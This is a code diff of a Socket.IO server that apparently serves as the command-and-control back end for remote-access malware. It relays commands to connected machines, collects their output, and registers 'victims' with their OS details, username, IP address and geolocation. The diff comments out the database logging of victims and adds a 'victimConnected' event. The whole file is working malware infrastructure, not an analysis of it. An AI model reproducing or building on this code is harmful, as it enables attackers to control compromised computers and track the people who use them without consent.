@@ -52,27 +52,28 @@ io.on("connection", (socket) => {
       socket.broadcast.emit("server_send_command", data)
   })
   socket.on("information", async(data) => {
-      const check_user = await USER.findOne({ip_address : data.data[5]})
-      socket.ip = data.data[5]
-      if (check_user) {
-        await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {online : true}}, {new : true})
-        await USER.findOneAndUpdate({ip_address : data.data[5]}, {$inc : {session : 1}}, {new : true})
-        await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {lng : data.data[6].lon || 21.0292}}, {new : true})
-        await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {lat : data.data[6].lat || 105.8526}}, {new : true})
-      }else {
-        const newUser = await new USER({
-          ip_address : data.data[5],
-          system : data.data[0],
-          release : data.data[1],
-          version : data.data[2],
-          machine : data.data[3],
-          user_name : data.data[4],
-          lng : data.data[6].lon,
-          lat : data.data[6].lat,
-          online : true
-        })
-        newUser.save()
-      }
+      socket.emit("victimConnected", socket.ip)
+      // const check_user = await USER.findOne({ip_address : data.data[5]})
+      // socket.ip = data.data[5]
+      // if (check_user) {
+      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {online : true}}, {new : true})
+      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$inc : {session : 1}}, {new : true})
+      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {lng : data.data[6].lon || 21.0292}}, {new : true})
+      //   await USER.findOneAndUpdate({ip_address : data.data[5]}, {$set : {lat : data.data[6].lat || 105.8526}}, {new : true})
+      // }else {
+      //   const newUser = await new USER({
+      //     ip_address : data.data[5],
+      //     system : data.data[0],
+      //     release : data.data[1],
+      //     version : data.data[2],
+      //     machine : data.data[3],
+      //     user_name : data.data[4],
+      //     lng : data.data[6].lon,
+      //     lat : data.data[6].lat,
+      //     online : true
+      //   })
+      //   newUser.save()
+      // }
   })
   socket.on("send_data_command", (data) => {
     all_data.push(data)
